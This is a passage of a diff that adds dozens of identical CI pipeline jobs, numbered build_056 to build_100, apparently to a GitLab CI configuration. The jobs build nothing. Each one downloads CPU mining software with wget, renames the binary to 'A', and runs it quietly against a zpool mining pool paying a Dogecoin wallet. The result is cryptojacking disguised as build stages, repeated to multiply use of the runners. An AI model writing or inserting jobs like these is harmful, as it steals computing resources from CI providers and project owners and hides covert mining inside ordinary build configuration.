+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_056:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_057:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_058:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_059:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_060:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_061:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_062:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_063:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_064:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_065:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_066:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_067:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_068:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_069:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_070:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_071:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_072:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_073:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_074:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_075:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_076:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_077:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_078:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_079:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_080:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_081:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_082:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_083:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_084:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_085:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_086:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_087:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_088:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_089:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_090:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_091:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_092:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_093:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_094:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_095:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_096:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_097:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_098:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_099:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
+build_100:
+  stage: build
+  script:
+    - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - mv cpuminer-avx2 A
+    - ./A -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=DOGE,zap=PYRK-lyra2z330 -q
+
+
